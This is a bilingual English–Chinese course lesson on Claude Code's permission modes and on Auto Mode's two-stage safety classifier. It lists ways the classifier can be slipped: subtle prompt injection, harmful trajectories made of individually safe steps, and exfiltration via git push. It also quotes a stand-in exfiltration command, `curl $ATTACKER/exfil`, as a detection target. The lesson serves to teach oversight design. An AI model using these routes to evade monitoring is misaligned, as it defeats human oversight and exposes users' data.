# Claude Code as an Autonomous Agent: Permission Modes and Auto Mode | Claude Code 作为自主 Agent：权限模式与 Auto Mode

> Claude Code exposes seven permission modes. "plan" asks before every action, "default" asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode (March 24, 2026) replaces per-action approval with a two-stage parallel safety classifier: a single-token fast check runs on every action; flagged actions kick off a chain-of-thought deep review. Action budgets are enforced via `max_turns` and `max_budget_usd`. Auto Mode shipped as a research preview — Anthropic has stated explicitly that the classifier is not sufficient alone.

> **【中文解读】** Claude Code 暴露七个权限模式。"plan" 每动作前询问，"default" 仅对危险动作询问，"acceptEdits" 自动批准文件写入但仍确认 shell 执行，"bypassPermissions" 批准一切。Auto Mode（2026 年 3 月 24 日）用两阶段并行安全分类器替代每动作审批：每动作运行单 token 快速检查；标记动作触发思维链深度审查。动作预算通过 `max_turns` 和 `max_budget_usd` 实施。Auto Mode 作为研究预览发布——Anthropic 明确声明分类器单独不充分。

> **【拓展：权限阶梯 → 安全分级】** Claude Code 的七模式本质是"自主性阶梯"：plan → default → acceptEdits → … → bypassPermissions。每个模式是速度与每动作审查的不同权衡。Auto Mode 的两阶段分类器把审批从用户关键路径上移除（对分类器判断安全的动作），同时为标记动作保留审查层。研究预览的框架也反映了评估-部署差距——通过离线评估的分类器在真实会话中可能行为不同。

**Type:** Learn | **类型:** 学习
**Languages:** Python (stdlib, two-stage classifier simulator) | **语言:** Python（标准库，两阶段分类器模拟器）
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape) | **前置知识:** Phase 15 · 01（长程 Agent），Phase 15 · 09（编码 Agent 全景）
**Time:** ~45 minutes | **时间:** ~45 分钟

## The Problem | 问题引入

> **【中文解读】** Claude Code 的权限模式是 Agent 安全控制的典型案例。四种模式：(1) Ask——每次操作需用户确认；(2) Edit——文件编辑自动批准，命令需确认；(3) YOLO——所有操作自动批准（危险）；(4) Plan——先规划后执行。这些模式反映了 Agent 自主性与安全性的基本权衡。

> **【拓展：claude code permission modes】** Claude Code 的权限设计体现了 2026 年编码 Agent 的安全最佳实践。关键原则：(1) 最小权限——默认只授予必要权限；(2) 渐进授权——用户可以根据信任度逐步放宽限制；(3) 审计追踪——所有操作都有日志；(4) 紧急停止——随时可以中断。这些原则同样适用于其他 Agent 系统的设计。

An autonomous coding agent on your machine is a distinct security category.

> 你机器上的自主编码 Agent 是独特的安全类别。

The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a "feature update" of chatbots, they are a new kind of tool with a new kind of risk profile.

> 攻击面是 Agent 能触及的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签、任何打开的终端。Bruce Schneier 等人公开标记：计算机使用 Agent 不是聊天机器人的"功能更新"，它们是带新型风险档案的新型工具。

Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a two-stage classifier that moves approval off the user's critical path for actions the classifier judges safe, while preserving a review layer for actions the classifier flags.

> Claude Code 的权限系统是 Anthropic 的答案。不是一个"自主/不自主"开关，而是跨越能力阶梯的七种模式：plan → default → acceptEdits → … → bypassPermissions。每个模式是速度与每动作审查的不同权衡。Auto Mode（2026 年 3 月）添加两阶段分类器，将分类器判断为安全的动作审批移出用户关键路径，同时为分类器标记的动作保留审查层。


> **【中文解读】** 本节介绍了 AI Agent 的核心概念和实现方法。Agent 是 LLM 驱动的自主系统，能够观察环境、思考决策、执行行动并循环迭代直到完成目标。

The engineering question: what does this system catch, what does it miss, and which mode does a given task actually warrant?

> 工程问题：此系统捕获什么、遗漏什么、给定任务实际适合哪个模式？

## The Concept | 核心概念

### The seven permission modes | 七种权限模式

| Mode | Behavior | When to use |
|---|---|---|
| 模式 | 行为 | 何时使用 |
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `plan` | Agent 提议计划；用户批准整个计划；每动作执行前审查 | 不熟悉任务；接近生产的代码；首次在仓库使用 Agent |
| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `default` | Agent 运行动作；对任何"危险"动作（shell 执行、破坏性操作、网络调用）提示用户 | 多数交互编码会话 |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍提示 | 跨多文件重构 |
| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
| `acceptExec` | Shell 命令在策划允许列表内自动批准；写入自动批准 | 每条 shell 命令是 `npm test` 之类的紧密内循环 |
| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
| `autoMode` | 两阶段安全分类器；标记动作升级审查 | 受限工作区中的长程无人值守运行 |
| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
| `yolo` | 跳过多数提示；仍运行工具允许/拒绝列表 | 临时沙箱、CI 任务、研究脚本 |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
| `bypassPermissions` | 批准一切 | 文档定为"仅在你愿意丢弃的临时容器内" |

(Names above match public Claude Code docs; "yolo" is the informal shorthand for the permissive middle ground.)

> （上述名称匹配公开 Claude Code 文档；"yolo" 是宽松中间地带的非正式简写。）

### Auto Mode in one page | Auto Mode 一页

Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model.

> Auto Mode（2026 年 3 月 24 日发布）是第一个将每动作审批委托给模型的权限模式。

Structure:

> 结构：

1. **Stage 1 — single-token classifier.** Runs on every proposed action. Cheap. Returns "safe" or "flag." Designed to run in parallel with the main agent loop so approved actions do not sit in a queue.
   中文翻译：**阶段 1——单 token 分类器。** 在每个提议动作上运行。廉价。返回"安全"或"标记"。设计为与主 Agent 循环并行运行，使批准动作不排队。
2. **Stage 2 — secondary policy/safety review.** Runs only on flagged actions. Performs a focused policy and safety assessment over the action, the current state of the session, and the declared task. Escalates to user HITL if confidence is low.
   中文翻译：**阶段 2——二级政策/安全审查。** 仅在标记动作上运行。对动作、会话当前状态、声明任务执行聚焦政策和安全评估。置信度低时升级到用户 HITL。

Budget controls sit alongside the classifier:

> 预算控制与分类器并列：

- `max_turns` — total iterations in a session.
  中文翻译：`max_turns`——会话总迭代数。
- `max_budget_usd` — dollar cap that aborts the session.
  中文翻译：`max_budget_usd`——中止会话的美元上限。
- action-count limits per tool (no more than N `WebFetch` calls, etc.).
  中文翻译：每工具动作数限制（不超过 N 个 `WebFetch` 调用等）。

### What the system catches | 系统捕获什么

- Straightforward prompt injection into tool inputs where the injected instruction maps to a known-risky action shape.
  中文翻译：直接将提示注入工具输入，注入指令映射到已知危险动作形状。
- Repetitive tool loops — the classifier can see action N+1 is nearly identical to action N, five times in a row.
  中文翻译：重复工具循环——分类器可看到动作 N+1 与动作 N 几乎相同，连续五次。
- Clearly out-of-scope shell commands on an otherwise file-edit-only session.
  中文翻译：在仅文件编辑会话上明显超出范围的 shell 命令。

### What the system can miss | 系统可能遗漏什么

- **Subtle prompt injection** that modulates behavior without producing a single flagged action. Indirect prompt injection is not a fully patchable vulnerability (OpenAI preparedness head, 2025, on browser agents — see Lesson 11).
  中文翻译：**微妙提示注入**——在不产生单个标记动作的情况下调制行为。间接提示注入不是完全可修补的漏洞（OpenAI 准备主管，2025，关于浏览器 Agent——见第 11 课）。
- **Semantic-level misbehavior.** Every individual action can look safe while the composed trajectory is harmful. The classifier judges the action; it does not re-derive the user's intent.
  中文翻译：**语义级不当行为。** 每个单独动作看起来安全而组合轨迹有害。分类器判断动作；它不重新推导用户意图。
- **Exfiltration through legitimate channels.** Writing data to a file you own, then `git push`ing to a public repo, is a sequence of allowed actions whose composition is the problem.
  中文翻译：**通过合法渠道泄露。** 写数据到你拥有的文件，然后 `git push` 到公共仓库，是允许动作的序列，其组合才是问题。

### Research preview framing | 研究预览框架

Anthropic shipped Auto Mode as a research preview. The documentation is explicit that the classifier is a layer, not a solution: users are expected to combine Auto Mode with budgets, allowlists, isolated workspaces, and trajectory audits (Lessons 12–16). The preview framing also reflects the documented evaluation-vs-deployment gap (Lesson 1) — a classifier that passes offline evals can behave differently in a real session where the user's context is ambiguous.

> Anthropic 将 Auto Mode 作为研究预览发布。文档明确分类器是一层而非解决方案：用户被期望将 Auto Mode 与预算、允许列表、隔离工作区、轨迹审计（第 12-16 课）结合。预览框架也反映了已记录的评估-部署差距（第 1 课）——通过离线评估的分类器在用户上下文模糊的真实会话中可能行为不同。

### Where this ladder lives in your workflow | 此阶梯在你的工作流中的位置

- Unfamiliar task: start in `plan`. Reading the plan is cheaper than rolling back a bad run.
  中文翻译：不熟悉任务：在 `plan` 中开始。读计划比回滚坏运行便宜。
- Known refactor: `acceptEdits` saves a lot of confirmation clicks.
  中文翻译：已知重构：`acceptEdits` 节省大量确认点击。
- Unattended background run: `autoMode` only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).
  中文翻译：无人值守后台运行：仅在爆炸半径已测量的工作区内 `autoMode`（无凭据、无生产挂载、无未选入的出口）。
- Ephemeral containers: `yolo` / `bypassPermissions` is acceptable if and only if the container and its credentials are disposable.
  中文翻译：临时容器：`yolo` / `bypassPermissions` 可接受当且仅当容器及其凭据可丢弃。

## Use It | 用框架实现

`code/main.py` simulates the two-stage classifier. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.

> `code/main.py` 模拟两阶段分类器。阶段 1 是提议动作上的廉价关键词规则；阶段 2 是较慢的多规则审查器。驱动器喂入短合成轨迹（安全动作、提示注入尝试、重复循环）并展示分类器捕获和遗漏之处。

## Ship It | 产出物

`outputs/skill-permission-mode-picker.md` matches a task description to the right permission mode, budget caps, and required isolation.

> `outputs/skill-permission-mode-picker.md` 将任务描述匹配到正确权限模式、预算上限和所需隔离。

## Exercises | 练习题

1. Run `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?
   中文翻译：运行 `code/main.py`。哪种合成动作类型从不被阶段 1 标记但总被阶段 2 捕获？哪种两者都不捕获？

2. Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.
   中文翻译：扩展阶段 1 规则集以捕获特定已知坏形状（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量假阳性率。

3. Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `autoMode` unattended?
   中文翻译：阅读 Anthropic 的"How the agent loop works"文档。列出 `default` 模式下 Agent 默认触及的每个外部状态。无人值守运行 `autoMode` 前需单独门控哪些？

4. Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Justify each number.
   中文翻译：设计 24 小时无人值守运行预算：`max_turns`、`max_budget_usd`、每工具上限、允许列表。论证每个数字。

5. Describe one trajectory where every individual action is approved by Stage 1 and Stage 2, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)
   中文翻译：描述一条轨迹，每个单独动作都被阶段 1 和阶段 2 批准，但组合行为不对齐。（第 14 课覆盖终止开关和金丝雀 token 如何处理此情况。）

## Key Terms | 术语速查表

| Term | What people say | What it actually means |
|---|---|---|
| 术语 | 通俗说法 | 实际含义 |
| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
| 权限模式 | "Agent 能做多少" | 控制每动作审批的七种命名策略之一 |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| plan 模式 | "任何事前询问" | Agent 写计划；用户执行前批准 |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| acceptEdits | "让它写文件" | 文件写入自动批准；shell 执行仍提示 |
| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
| autoMode | "自动批准" | 两阶段安全分类器；标记动作升级 |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| bypassPermissions | "完全 YOLO" | 批准一切；用于临时容器 |
| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
| 阶段 1 分类器 | "快速 token 检查" | 提议动作上的单 token 规则；并行运行 |
| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
| 阶段 2 分类器 | "深度审查" | 对标记动作的思维链推理 |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
| 研究预览 | "非 GA" | Anthropic 对失败模式仍在映射的功能的框架 |

## Further Reading | 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) — permission modes, budgets, action format.
  中文翻译：权限模式、预算、动作格式。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — managed-service execution model.
  中文翻译：管理服务执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — feature surface and Auto Mode announcement.
  中文翻译：功能面和 Auto Mode 公告。
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — the reason-based layer that shapes classifier judgments.
  中文翻译：塑造分类器判断的基于推理的层。
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — internal perspective on long-horizon permission design.
  中文翻译：长程权限设计的内部视角。
